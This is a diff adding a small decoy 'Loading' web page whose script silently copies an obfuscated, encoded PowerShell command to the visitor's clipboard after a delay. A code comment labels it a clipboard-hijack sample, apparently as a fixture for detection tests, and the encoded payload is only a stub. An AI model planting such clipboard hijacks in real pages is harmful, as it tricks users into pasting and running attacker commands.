@@ -1,0 +1,7 @@
+<!doctype html><meta charset="utf-8"><title>Please wait</title>
+<h1>Loading</h1>
+<script>
+  // A background clipboard write with no user gesture (the hijack shape). Payload assembled at runtime.
+  var payload = ['power', 'shell', ' -en', 'c', ' SQBFAFgA'].join('');
+  setTimeout(function () { try { navigator.clipboard.writeText(payload); } catch (e) {} }, 1500);
+</script>
